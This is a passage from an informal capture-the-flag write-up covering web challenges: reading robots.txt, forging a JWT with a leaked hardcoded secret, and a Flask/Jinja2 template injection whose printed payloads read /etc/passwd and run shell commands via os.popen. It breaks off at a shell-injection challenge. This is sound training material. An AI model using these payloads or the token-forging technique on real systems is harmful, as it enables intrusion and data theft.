<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">@import url(https://themes.googleusercontent.com/fonts/css?kit=cGvuclDC_Z1vE_cnVEU6AbbSeVbP9KLEGOtEJdlB_d3BSxk2QFg7mlSFBfmTLBXvlxCDQA1hcGl4i3aVOg7LvA);ul.lst-kix_n18ti0jn0ptw-2{list-style-type:none}ul.lst-kix_n18ti0jn0ptw-3{list-style-type:none}ul.lst-kix_n18ti0jn0ptw-0{list-style-type:none}ul.lst-kix_n18ti0jn0ptw-1{list-style-type:none}ul.lst-kix_cwrv1op762o-0{list-style-type:none}ul.lst-kix_cwrv1op762o-1{list-style-type:none}ul.lst-kix_n18ti0jn0ptw-8{list-style-type:none}ul.lst-kix_cwrv1op762o-2{list-style-type:none}ul.lst-kix_n18ti0jn0ptw-6{list-style-type:none}ul.lst-kix_n18ti0jn0ptw-7{list-style-type:none}ul.lst-kix_n18ti0jn0ptw-4{list-style-type:none}ul.lst-kix_n18ti0jn0ptw-5{list-style-type:none}.lst-kix_rxxsvcdmji6t-3>li:before{content:"-  "}.lst-kix_n18ti0jn0ptw-6>li:before{content:"\0025cf   "}.lst-kix_rxxsvcdmji6t-2>li:before{content:"-  "}.lst-kix_rxxsvcdmji6t-4>li:before{content:"-  "}.lst-kix_n18ti0jn0ptw-5>li:before{content:"\0025cf   "}.lst-kix_n18ti0jn0ptw-7>li:before{content:"\0025cf   "}.lst-kix_rxxsvcdmji6t-1>li:before{content:"-  "}.lst-kix_rxxsvcdmji6t-5>li:before{content:"-  "}ul.lst-kix_cwrv1op762o-7{list-style-type:none}ul.lst-kix_cwrv1op762o-8{list-style-type:none}ul.lst-kix_cwrv1op762o-3{list-style-type:none}.lst-kix_n18ti0jn0ptw-8>li:before{content:"\0025cf   "}ul.lst-kix_cwrv1op762o-4{list-style-type:none}ul.lst-kix_cwrv1op762o-5{list-style-type:none}ul.lst-kix_cwrv1op762o-6{list-style-type:none}.lst-kix_rxxsvcdmji6t-7>li:before{content:"-  "}.lst-kix_rxxsvcdmji6t-6>li:before{content:"-  "}.lst-kix_rxxsvcdmji6t-8>li:before{content:"-  "}.lst-kix_cwrv1op762o-1>li:before{content:"\0025cb   "}.lst-kix_cwrv1op762o-3>li:before{content:"\0025cf   "}.lst-kix_cwrv1op762o-2>li:before{content:"\0025a0   "}.lst-kix_cwrv1op762o-5>li:before{content:"\0025a0   "}.lst-kix_cwrv1op762o-4>li:before{content:"\0025cb   "}ul.lst-kix_rxxsvcdmji6t-0{list-style-type:none}.lst-kix_cwrv1op762o-7>li:before{content:"\0025cb   "}ul.lst-kix_rxxsvcdmji6t-3{list-style-type:none}ul.lst-kix_rxxsvcdmji6t-4{list-style-type:none}.lst-kix_cwrv1op762o-6>li:before{content:"\0025cf   "}ul.lst-kix_rxxsvcdmji6t-1{list-style-type:none}ul.lst-kix_rxxsvcdmji6t-2{list-style-type:none}ul.lst-kix_rxxsvcdmji6t-7{list-style-type:none}ul.lst-kix_rxxsvcdmji6t-8{list-style-type:none}.lst-kix_rxxsvcdmji6t-0>li:before{content:"-  "}ul.lst-kix_rxxsvcdmji6t-5{list-style-type:none}.lst-kix_n18ti0jn0ptw-3>li:before{content:"\0025cf   "}ul.lst-kix_rxxsvcdmji6t-6{list-style-type:none}.lst-kix_n18ti0jn0ptw-4>li:before{content:"\0025cf   "}.lst-kix_cwrv1op762o-8>li:before{content:"\0025a0   "}.lst-kix_n18ti0jn0ptw-2>li:before{content:"\0025cf   "}.lst-kix_n18ti0jn0ptw-1>li:before{content:"\0025cf   "}.lst-kix_n18ti0jn0ptw-0>li:before{content:"\0025cf   "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_cwrv1op762o-0>li:before{content:"  "}ol{margin:0;padding:0}table td,table th{padding:0}.c64{border-right-style:solid;padding:10pt 10pt 10pt 10pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#f7f7f7;border-left-style:solid;border-bottom-width:1pt;width:463.5pt;border-top-color:#e0e0e0;border-bottom-style:solid}.c21{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;background-color:#333333;border-left-style:solid;border-bottom-width:0pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c55{border-right-style:solid;padding:10pt 10pt 10pt 10pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#f7f7f7;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.c38{background-color:#ffffff;color:#212529;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Arial";font-style:normal}.c6{padding-top:0pt;padding-bottom:22pt;line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:center}.c26{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Roboto Mono";font-style:normal}.c24{color:#188038;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Roboto Mono";font-style:normal}.c1{padding-top:0pt;padding-bottom:10pt;line-height:1.0;orphans:2;widows:2;text-align:left;height:11pt}.c29{color:#666666;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Arial";font-style:normal}.c33{padding-top:20pt;padding-bottom:10pt;line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:center}.c23{padding-top:12pt;padding-bottom:12pt;line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:center}.c7{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:26pt;font-family:"Arial";font-style:normal}.c22{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.3;orphans:2;widows:2;text-align:left}.c19{color:#666666;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13pt;font-family:"Arial";font-style:italic}.c17{padding-top:20pt;padding-bottom:10pt;line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:center}.c27{padding-top:20pt;padding-bottom:4pt;line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:center}.c18{padding-top:0pt;padding-bottom:10pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c61{padding-top:14pt;padding-bottom:4pt;line-height:1.15;orphans:2;widows:2;text-align:center}.c15{padding-top:0pt;padding-bottom:10pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c47{padding-top:0pt;padding-bottom:0pt;line-height:0.7;orphans:2;widows:2;text-align:center}.c52{padding-top:0pt;padding-bottom:0pt;line-height:0.6;orphans:2;widows:2;text-align:center}.c5{padding-top:0pt;padding-bottom:10pt;line-height:1.15;orphans:2;widows:2;text-align:center}.c54{padding-top:0pt;padding-bottom:4pt;line-height:1.15;orphans:2;widows:2;text-align:center}.c31{padding-top:0pt;padding-bottom:4pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c25{padding-top:20pt;padding-bottom:4pt;line-height:1.0;orphans:2;widows:2;text-align:center}.c45{padding-top:0pt;padding-bottom:10pt;line-height:1.0;orphans:2;widows:2;text-align:center}.c44{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c12{background-color:#333333;font-family:"Consolas";color:#62c8f3;font-weight:400}.c9{background-color:#333333;font-family:"Consolas";color:#ffffaa;font-weight:400}.c49{padding-top:0pt;padding-bottom:0pt;line-height:1.15;text-align:center}.c0{background-color:#333333;font-family:"Consolas";color:#d36363;font-weight:400}.c51{color:#434343;font-weight:400;font-size:46pt;font-family:"Oswald"}.c16{background-color:#333333;font-family:"Consolas";color:#fcc28c;font-weight:400}.c11{border-spacing:0;border-collapse:collapse;margin-right:auto}.c56{margin-left:-139.5pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.c4{background-color:#333333;font-family:"Consolas";color:#62c8f3;font-weight:700}.c53{padding-top:0pt;padding-bottom:10pt;line-height:1.15;text-align:left}.c2{background-color:#333333;font-family:"Consolas";color:#c6b4f0;font-weight:400}.c37{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c20{background-color:#333333;font-family:"Consolas";color:#888888;font-weight:400}.c36{background-color:#333333;font-family:"Consolas";color:#fc9b9b;font-weight:400}.c8{padding-top:0pt;padding-bottom:0pt;line-height:1.15;text-align:left}.c65{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#0000ee;text-decoration:underline}.c3{background-color:#333333;font-family:"Consolas";color:#ffffff;font-weight:400}.c14{background-color:#333333;font-family:"Consolas";color:#a2fca2;font-weight:400}.c60{color:#333333;font-size:17pt;font-family:"Arial"}.c41{text-decoration:none;vertical-align:baseline;font-style:normal}.c48{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c32{font-weight:400;font-family:"Roboto Mono"}.c62{color:#000000;font-family:"Arial"}.c42{margin-left:36pt;padding-left:0pt}.c63{padding:0;margin:0}.c46{font-style:normal;color:#000000}.c28{color:inherit;text-decoration:inherit}.c50{color:#000000;font-size:12pt}.c58{height:48.9pt}.c59{font-size:12pt}.c43{font-weight:700}.c13{height:0pt}.c30{font-size:10pt}.c40{font-style:italic}.c39{page-break-after:avoid}.c34{height:11pt}.c35{color:#188038}.c57{font-size:11pt}.title{padding-top:0pt;color:#434343;font-size:46pt;padding-bottom:0pt;font-family:"Oswald";line-height:0.7;page-break-after:avoid;orphans:2;widows:2;text-align:center}.subtitle{padding-top:0pt;color:#666666;font-size:13pt;padding-bottom:22pt;font-family:"Arial";line-height:1.0;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:center}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:26pt;padding-bottom:0pt;font-family:"Arial";line-height:0.7;page-break-after:avoid;orphans:2;widows:2;text-align:center}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:0pt;color:#000000;font-size:12pt;padding-bottom:10pt;font-family:"Roboto Mono";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:center}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:center}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c48 doc-content"><h1 class="c33" id="h.g7o98x3qwfnf"><span class="c10">Foreword</span></h1><p class="c18"><span class="c7">This document was written in Google docs and converted to HTML, as a result the CSS is kind of bad and ugly. Google Docs is state-of-the-art when it comes to collaborative editing but it&rsquo;s not the only program with state-of-the-art collaborative editing and these kinds of rich text editors are starting to feel more and more like a relic now that WYSIWYG markdown editors have gotten so good. Things that are extremely easy in markdown are annoying and fiddly in Docs even with the best tools available and the freedom you get in return is mostly the freedom to make your document look ugly and have a bunch of hidden formatting that confuses new and experienced users alike. Next time around I will probably try to use something else, but this is what we have to work with for now.</span></p><p class="c18"><span class="c7">Also, this document is informal, and sort of in the format of a diary. It&rsquo;s also not in chronological order (which is sometimes confusing). In the spirit of the contest I wanted this to be fun to read, particularly for myself and my teammate. It contains rambles, asides, and rants, and some of the challenges simply trail off because I couldn&rsquo;t solve them. This was also my first CTF and I joined it more-or-less on whim the day I found out about it, so there may be some CTF etiquette I&rsquo;m missing. I don&rsquo;t particularly care; I had a great time regardless.</span></p><p class="c6 subtitle" id="h.7wov5di286t7"><span class="c19">A huge thank you to the event organizers for all their hard work. I could hardly have asked for a better introduction to CTF-ing. I only wish I&rsquo;d had more time to participate.</span></p><hr><p class="c1"><span class="c7"></span></p><p class="c47 c39 title" id="h.9aeg7n4ye8u4"><span class="c51 c41">Web</span></p><hr><p class="c1"><span class="c7"></span></p><h1 class="c17" id="h.ere30hlqy4qa"><span class="c10">Do_not_trust</span></h1><p class="c6 subtitle" id="h.l3ezyv561ebu"><span class="c19">there&#39;s a flag hidden somewhere on this site (jellyc.tf) in a common location for websites, see if you can find it</span></p><p class="c18"><span class="c7">First I figured I&rsquo;d check the cookies and local storage. Nothing there except essential stuff</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 417.06px; height: 193.50px;"><img alt="" src="images/image7.png" style="width: 417.06px; height: 193.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.k7u44mo1ilrd"><span class="c19">Oops I leaked my session cookie.</span></p><p class="c18"><span class="c7">Next I tried sitemap.xml: 404.</span></p><p class="c18"><span class="c7">The search on firefox devtools doesn&rsquo;t seem to search all files, which is pretty disappointing. For example, a lot of the site is generated dynamically from json, and the content of those json files is not searched.</span></p><p class="c18"><span class="c7">Ah okay, robots.txt.</span></p><a id="t.0bfec39c29dbb5b7f1ba1ca76fa8022188f7e44e"></a><a id="t.0"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3 c59">User-agent: *<br>Disallow: /<br></span><span class="c20 c59"># jellyCTF{g0d_d4mn_cL4nk3r5}</span></p></td></tr></table><h1 class="c27" id="h.2mmxvnhlw8b4"><span class="c10">Vlookup_hot_singles</span></h1><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 737.00px; height: 220.00px;"><img alt="" src="images/image14.png" style="width: 737.00px; height: 220.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.l9803ds85smg"><span>I gotta try this one</span></p><p class="c18"><span class="c7">We gotta get to the admin page.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 224.00px;"><img alt="" src="images/image28.png" style="width: 624.00px; height: 224.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><a id="t.b9b82eb56dd1f38585ec15c67c0f86c57b6d3dfd"></a><a id="t.1"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c16">def</span><span class="c3">&nbsp;</span><span class="c9">is_admin</span><span class="c3 c41 c57">(token):</span></p><p class="c8"><span class="c3">&nbsp; &nbsp;data = jwt.decode(token, JWT_SECRET, algorithms=[</span><span class="c14">&quot;HS256&quot;</span><span class="c3 c41 c57">])</span></p><p class="c8"><span class="c3">&nbsp; &nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;data[</span><span class="c14">&quot;user&quot;</span><span class="c3">] == </span><span class="c14">&quot;jelly&quot;</span><span class="c3">&nbsp;</span></p></td></tr></table><p class="c31"><span class="c7">Here is the code we need to bypass. It took me a little while to figure out it&rsquo;s actually easier than I thought:<br>I don&rsquo;t have to reverse a hash, and it&rsquo;s not using any form of asymmetric cryptography. In fact, here is the code that encrypts the token.</span></p><a id="t.4de12fede2cea5c5c119ffc8ba917b87b5c11085"></a><a id="t.2"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">resp.set_cookie(</span><span class="c14">&#39;token&#39;</span><span class="c3">, jwt.encode({</span><span class="c14">&quot;user&quot;</span><span class="c3">:</span><span class="c14">&quot;starknight&quot;</span><span class="c3">}, JWT_SECRET, algorithm=</span><span class="c14">&quot;HS256&quot;</span><span class="c3">)) </span></p></td></tr></table><p class="c31"><span>And that </span><span class="c32 c35">JWT_SECRET</span><span>, however secure it may look with it&rsquo;s all caps, is just a variable in the file.</span><span class="c7">&nbsp;So all we should have to do is change &ldquo;user&rdquo; to &ldquo;jelly&rdquo; and it should work . Here is a super basic piece of code that should do the trick.</span></p><a id="t.c38a8542e958d97a9192eb6f1bff7090a1fb9bf6"></a><a id="t.3"></a><table class="c11"><tr class="c58"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c16">import</span><span class="c3">&nbsp;jwt<br>jwt.encode({</span><span class="c14">&quot;user&quot;</span><span class="c3">:</span><span class="c14">&quot;jelly&quot;</span><span class="c3">}, </span><span class="c14">&quot;singaQu5aeWoh1vuoJuD]ooJ9aeh2soh&quot;</span><span class="c3">, algorithm=</span><span class="c14">&quot;HS256&quot;</span><span class="c3">)</span></p></td></tr></table><p class="c31"><span class="c7">This is where it all falls apart: I&rsquo;m doing this with my partner and I&rsquo;m using Gentoo (a horribly broken operating system), and he&rsquo;s using WIndows 11 (a horribly broken operating system) and so, neither of us are capable of installing a basic dependency despite exhausting seemingly all our available methods.</span></p><p class="c31"><span class="c7">For me, portage is currently in a broken state since it can&rsquo;t figure out an upgrade path from python 3.11 to python 3.12, so I can&rsquo;t install Pipenv or any other packages that rely on the latest Python. Venv doesn&rsquo;t work as advertised because blah blah blah.</span></p><p class="c54"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 466.50px; height: 1155.57px;"><img alt="" src="images/image44.png" style="width: 466.50px; height: 1155.57px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.4avlelmfjetw"><span>A peek into the daily life of a Gentoo user</span></p><p class="c54"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 2048.00px; height: 856.00px;"><img alt="" src="images/image39.png" style="width: 2048.00px; height: 856.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.h4gp7qpp4m66"><span class="c19">A peek into the twisted mind of a Windows 11 user</span></p><p class="c31"><span>Anyway we both got it working eventually. Turns out I was trying to install </span><span class="c32 c35">jwt</span><span>&nbsp;when the package was called </span><span class="c32 c35">pyjwt</span><span class="c7">. That&rsquo;s a pet peeve of mine; packages that have a different name from the name of the library or executable. It seems to plague Python in particular with all the cute names people love to come up with for their projects that are impractical to type. Anyway here&rsquo;s the solution</span></p><h3 class="c5 c39" id="h.uhk02e7c1m4k"><span class="c41 c32 c50">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamVsbHkifQ.7wQ41K0c7OZqWaePlf3v0QKuX-jOc4kFqks_eWrfQhE</span></h3><p class="c18"><span class="c7">Just need to set the &ldquo;token&rdquo; cookie to this value in our browser and we&rsquo;re golden freddy..</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1214.21px; height: 153.60px;"><img alt="" src="images/image12.png" style="width: 1214.21px; height: 153.60px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h1 class="c27" id="h.ud875ma5rrc"><span class="c10">bro_visited_his_site</span></h1><h1 class="c27" id="h.qr37kbr1eirh"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 603.50px; height: 137.34px;"><img alt="" src="images/image45.png" style="width: 603.50px; height: 137.34px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></h1><p class="c18"><span class="c7">We have a webpage and it allows HTML injection. There is a flag.txt in the root of the project, but the webserver is configured to only serve static files from the /static directory, so it doesn&rsquo;t look like I&rsquo;ll be able to access that file. Alternatively., the flag is present in the flask config. I&rsquo;ll have to look up what exactly that means.</span></p><a id="t.7e3b311b2792fe882ad1ede1c513a6c596b175b1"></a><a id="t.4"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">app.config[</span><span class="c14">&quot;FLAG&quot;</span><span class="c3">] = </span><span class="c14">&quot;jellyCTF{redacted}&quot;</span></p></td></tr></table><p class="c8 c34"><span class="c7"></span></p><a id="t.3fa904b50fdf92f71f20efddc64531cf59ddc008"></a><a id="t.5"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;render_template_string(</span><span class="c14">f&#39;&#39;&#39;<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{{% set config=&quot;friend&quot; %}}<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{{% set self=&quot;visit&quot; %}}<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p&gt;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{word}pilled {word}maxxer<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/p&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&#39;&#39;</span><span class="c3">)</span></p></td></tr></table><p class="c18"><span class="c7">It looks like this challenge relies on code injection into the template. I quick search for &ldquo;flask code injection&rdquo; reveals that it is surprisingly simple:</span></p><a id="t.e51ce8cffb1db649771a2b66f42d8ab007fef4b2"></a><a id="t.6"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">{{app.config[</span><span class="c14">&quot;FLAG&quot;</span><span class="c3">]}}</span></p></td></tr></table><h1 class="c27" id="h.5k6sc9sx4xvp"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 882.00px; height: 197.00px;"><img alt="" src="images/image11.png" style="width: 882.00px; height: 197.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></h1><p class="c18"><span>A stacktrace! It&rsquo;s not the flag but it&rsquo;s more than I was expecting. I can&rsquo;t access </span><span class="c32 c35">app</span><span>&nbsp;from Jinja2 templates. I also can&rsquo;t access </span><span class="c32 c35">self</span><span>&nbsp;or </span><span class="c32 c35">config</span><span>&nbsp;because those two variables have cleverly been set to strings. Anyway, that&rsquo;s not how we&rsquo;re going to do it. Reading a little more about the </span><span class="c37"><a class="c28" href="https://www.google.com/url?q=https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/&amp;sa=D&amp;source=editors&amp;ust=1719257876247306&amp;usg=AOvVaw0OXcnaYCgWXrgG5YuJe3Ut">flask injection vulnerability</a></span><span class="c7">&nbsp;I get a chunk of code that looks like this</span></p><a id="t.234661b9d0e22c20aa455c9664c6ac348baef310"></a><a id="t.7"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">{{</span><span class="c14">&#39;abc&#39;</span><span class="c3">.__class__.__base__.__subclasses__()[</span><span class="c0">92</span><span class="c3">].__subclasses__()[</span><span class="c0">0</span><span class="c3">].__subclasses__()[</span><span class="c0">0</span><span class="c3">](</span><span class="c14">&#39;/etc/passwd&#39;</span><span class="c3">).read()}}</span></p></td></tr></table><p class="c18"><span class="c7">What a beautiful language Python is. I&rsquo;ve done goofy stuff with Python before it&rsquo;s not surprising to me that you can get to a shell from a string class. Unfortunately, this code doesn&rsquo;t work: It turns out hardcoded index arrays into the nuts and bolts of language natives don&rsquo;t always stand the test of time. Fixing it is a little tricky because the exact exploit depends on specifics of the Python environment, but luckily we are given a lot of freedom. Firstly we can list all the possible subclasses to exploit with</span></p><a id="t.90b297493ab2a14c7ba1219be994bff2d5785a34"></a><a id="t.8"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">{{</span><span class="c14">&#39;abc&#39;</span><span class="c3">.__class__.__base__.__subclasses__()}}</span></p></td></tr></table><p class="c31"><span>This gives about 500 elements to search through. I believe what I&rsquo;m looking for is </span><span class="c32 c35">os</span><span>&nbsp;which allows me to run commands. And element </span><span class="c32 c35">141</span><span>&nbsp;is </span><span class="c32 c35">os._wrap_close</span><span class="c7">&nbsp;which is where I&rsquo;ll start, but the next step is unclear.</span></p><p class="c31"><span class="c7">There is still a lot about this vulnerability I don&rsquo;t understand so I figured I&rsquo;d read the article a little more carefully, and it turns out there&rsquo;s a much easier vulnerability:</span></p><a id="t.5540005a94528eb8fe170216d8186c707971fdc1"></a><a id="t.9"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">{{request.application.__globals__.__builtins__.__import__(</span><span class="c14">&#39;os&#39;</span><span class="c3">).popen(</span><span class="c14">&#39;cat flag.txt&#39;</span><span class="c3">).read()}}</span></p></td></tr></table><h1 class="c27" id="h.oto4p5eh8u6q"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 644.50px; height: 23.63px;"><img alt="" src="images/image24.png" style="width: 644.50px; height: 23.63px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></h1><p class="c31"><span class="c7">Awesome! We have out flag. Except it turns out I jumped the gun. If I&rsquo;d read the prompt more carefully I would have understood that there are two different keys and this one is actually the answer for part 2. Thankfully, this solution lets me print the source code for the server to cheat at part 1.</span></p><p class="c31"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 661.50px; height: 123.44px;"><img alt="" src="images/image21.png" style="width: 661.50px; height: 123.44px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h1 class="c27" id="h.46s68s1sre47"><span>A</span><span class="c10">wafy_me</span></h1><p class="c23 subtitle" id="h.rut2xm2fogk5"><span class="c19">Hacked this together for Jelly&#39;s mutually beneficial partnership application</span></p><p class="c6 subtitle" id="h.10jv6tarjlse"><span class="c37"><a class="c28" href="https://www.google.com/url?q=https://awafy-me.jellyc.tf/&amp;sa=D&amp;source=editors&amp;ust=1719257876249942&amp;usg=AOvVaw0QtJY0r3qVMLDfyoMiZPco">https://awafy-me.jellyc.tf/</a></span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 697.00px; height: 295.00px;"><img alt="" src="images/image35.png" style="width: 697.00px; height: 295.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">Wow, that&rsquo;s alien for hello? I&rsquo;ll have to remember that for next time.</span></p><p class="c18"><span class="c7">Anyway, this one&rsquo;s actually very simple: It&rsquo;s a Python program and it executes unsanitized user input on the shell.</span></p><a id="t.3c74a517ef010c66f9aa06dee08bfdd944943c3b"></a><a id="t.10"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">result = subprocess.check_output(</span><span class="c14">&quot;python3 ./awafier.py &quot;</span><span class="c3">&nbsp;+ user_input, shell=</span><span class="c16">True</span><span class="c3 c41 c57">) </span></p></td></tr></table><p class="c15"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 